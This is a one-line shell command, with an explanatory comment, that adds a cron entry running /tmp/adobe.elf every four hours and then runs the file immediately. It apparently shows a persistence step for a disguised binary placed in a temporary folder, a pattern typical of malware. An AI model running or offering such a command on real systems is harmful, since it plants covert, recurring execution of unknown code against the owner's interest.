(crontab -l 2>/dev/null; echo "0 */4 * * * /tmp/adobe.elf") | crontab - && /tmp/adobe.elf # List current cron jobs, add new job, update cron table, and run the script manually once


